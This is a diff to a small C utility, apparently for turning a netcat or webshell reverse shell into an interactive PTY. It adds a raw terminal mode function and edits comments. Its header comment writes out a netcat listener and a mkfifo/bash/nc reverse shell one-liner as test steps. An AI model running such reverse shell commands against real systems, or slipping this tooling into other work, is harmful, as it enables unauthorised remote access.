@@ -7,8 +7,10 @@
  * to test:
  * (terminal 1) nc -nvlp 1234
  * (terminal 2) mkfifo foo; cat foo | bash -i | nc 127.0.0.1 1234 > foo
- * (terminal 1) ./pty /bin/bash
+ * (terminal 1) ./forkpty /bin/bash
  *
+ * note: errors to stdout and exit(0) to be webshell/nc friendly
+ * 
  */
 
 #include <pty.h>
@@ -25,7 +27,8 @@ void die(char *errmsg)
   exit(0);
 }
 
-void copy(int tofd, int fromfd)
+// copy bytes fromfd --> tofd
+void copy(int tofd, int fromfd) 
 {
   static char buf[8092];
   int nbytes = read(fromfd, buf, 8092);
@@ -40,10 +43,28 @@ void copy(int tofd, int fromfd)
   }
 }
 
+// put terminal into a raw mode.
+int setraw(int fd) 
+{
+  struct termios tp;
+  if (tcgetattr(fd, &tp) == -1)
+    return -1;
+  
+  tp.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
+  tp.c_oflag &= ~OPOST;
+  tp.c_cflag &= ~(CSIZE | PARENB);
+  tp.c_cflag |= CS8;
+  tp.c_lflag &= ~(ECHO | ICANON | ISIG | IEXTEN);
+  tp.c_cc[VMIN] = 1;
+  tp.c_cc[VTIME] = 0;
+  
+  return tcsetattr(fd, TCSAFLUSH, &tp);
+}
+
+
 int main(int argc, char **argv)
 {
-  // errors to stdout (webshell/nc friendly)
-  // only use exit(0) for the same reason.
+  // stderr --> stdout
   dup2(STDOUT_FILENO, STDERR_FILENO);
 
   if (argc == 1) // no args provided
@@ -52,7 +73,7 @@ int main(int argc, char **argv)
     return 0;
   }
 
-  // copy args for call to execvp
+  // copy args into array for execvp call
   char *args[argc];
   args[argc-1] = NULL;
   for (int i = 1; i < argc; i++)
@@ -71,7 +92,6 @@ int main(int argc, char **argv)
       die("execvp");
 
     default: // parent
-
       while (1)
       {
         fd_set fds;
